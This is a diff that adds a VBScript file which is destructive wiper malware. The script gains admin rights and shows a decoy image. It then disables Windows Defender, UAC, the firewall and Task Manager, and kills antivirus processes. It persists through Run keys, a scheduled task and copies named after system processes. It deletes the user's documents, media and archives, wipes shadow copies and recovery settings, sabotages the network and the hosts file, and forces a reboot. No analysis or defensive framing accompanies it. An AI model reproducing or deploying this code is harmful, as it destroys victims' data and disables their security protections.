@@ -1,0 +1,95 @@
+On Error Resume Next
+
+If WScript.Arguments.length = 0 Then
+  Set objShell = CreateObject("Shell.Application")
+  objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " uac", "", "runas", 1
+  WScript.Quit
+Else
+  Set w = CreateObject("WScript.Shell")
+  Set fso = CreateObject("Scripting.FileSystemObject")
+
+  scriptPath = WScript.ScriptFullName
+  folder = fso.GetParentFolderName(scriptPath)
+  imagePath = folder & "\1.png"
+
+  If fso.FileExists(imagePath) Then
+      w.Run "rundll32.exe ""%USERPROFILE%\AppData\Local\Microsoft\Windows\Photo Viewer\PhotoViewer.dll"", ImageView_Fullscreen " & imagePath, 1, False
+  End If
+
+  w.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableAntiSpyware /t REG_DWORD /d 1 /f", 0, False
+  w.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f", 0, False
+  w.Run "reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v EnableLUA /t REG_DWORD /d 0 /f", 0, False
+  w.Run "netsh advfirewall set allprofiles state off", 0, False
+  w.Run "sc config WinDefend start= disabled", 0, False
+  w.Run "sc stop WinDefend", 0, False
+
+  procs = Array("MsMpEng.exe", "avp.exe", "kavsvc.exe", "avastsvc.exe", "avgnt.exe", "egui.exe", "bdagent.exe", "Avira.Systray.exe")
+  For Each p In procs
+      w.Run "taskkill /f /im " & p, 0, False
+  Next
+
+  w.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
+  w.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
+  w.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
+
+  w.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate", scriptPath, "REG_SZ"
+  w.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate", scriptPath, "REG_SZ"
+  w.Run "schtasks /create /tn ""MicrosoftWindowsUpdate"" /tr """ & scriptPath & """ /sc minute /mo 5 /f", 0, False
+
+  userProfile = w.ExpandEnvironmentStrings("%USERPROFILE%")
+  extensions = Array("*.txt", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.mp4", "*.mp3", "*.zip", "*.rar", "*.bak", "*.vbs", "*.lnk", "*.psd", "*.ai", "*.cdr", "*.pptx")
+  
+  targetFolders = Array(userProfile & "\Desktop", userProfile & "\Documents", userProfile & "\Downloads", userProfile & "\Pictures", userProfile & "\Videos", userProfile & "\Music", userProfile & "\OneDrive")
+  
+  For Each folderPath In targetFolders
+      If fso.FolderExists(folderPath) Then
+          For Each ext In extensions
+              On Error Resume Next
+              fso.DeleteFile folderPath & "\" & ext, True
+              fso.DeleteFile folderPath & "\*\" & ext, True
+              fso.DeleteFile folderPath & "\*\*\" & ext, True
+              On Error GoTo 0
+          Next
+      End If
+  Next
+
+  w.Run "vssadmin delete shadows /all /quiet", 0, False
+  w.Run "bcdedit /set {default} recoveryenabled No", 0, False
+  w.Run "bcdedit /set {default} bootstatuspolicy ignoreallfailures", 0, False
+  w.Run "wbadmin delete catalog -quiet", 0, False
+
+  networks = Array("Ethernet", "Wi-Fi", "WLAN", "Local Area Connection")
+  For Each net In networks
+      w.Run "netsh interface ip set dns """ & net & """ static 0.0.0.0", 0, False
+      w.Run "netsh interface ip set address """ & net & """ static 0.0.0.0 255.255.255.0", 0, False
+  Next
+
+  Set hosts = fso.OpenTextFile(w.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\drivers\etc\hosts", 8, True)
+  hosts.WriteLine "0.0.0.0 windowsupdate.microsoft.com"
+  hosts.WriteLine "0.0.0.0 www.microsoft.com"
+  hosts.WriteLine "0.0.0.0 update.microsoft.com"
+  hosts.WriteLine "0.0.0.0 www.kaspersky.com"
+  hosts.WriteLine "0.0.0.0 www.malwarebytes.com"
+  hosts.WriteLine "0.0.0.0 www.avast.com"
+  hosts.WriteLine "0.0.0.0 www.norton.com"
+  hosts.Close
+
+  sysRoot = w.ExpandEnvironmentStrings("%SystemRoot%")
+  targetPaths = Array(sysRoot & "\Temp\", sysRoot & "\System32\drivers\", userProfile & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\", sysRoot & "\System32\Tasks\")
+  For Each target In targetPaths
+      On Error Resume Next
+      fso.CopyFile scriptPath, target & "svchost.vbs", True
+      fso.CopyFile scriptPath, target & "winlogon.vbs", True
+      fso.CopyFile scriptPath, target & "lsass.vbs", True
+      On Error GoTo 0
+  Next
+
+  MsgBox "System Integrity Compromised", 16, "Security Alert"
+  
+  For i = 10 To 1 Step -1
+      MsgBox "Complete data destruction in: " & i & " seconds" & vbCrLf & vbCrLf & "DO NOT INTERRUPT", 48, "System Purge - " & i
+      WScript.Sleep 1000
+  Next
+  
+  w.Run "shutdown /r /t 5 /c ""System failure. Reboot initiated.""", 0, False
+End If
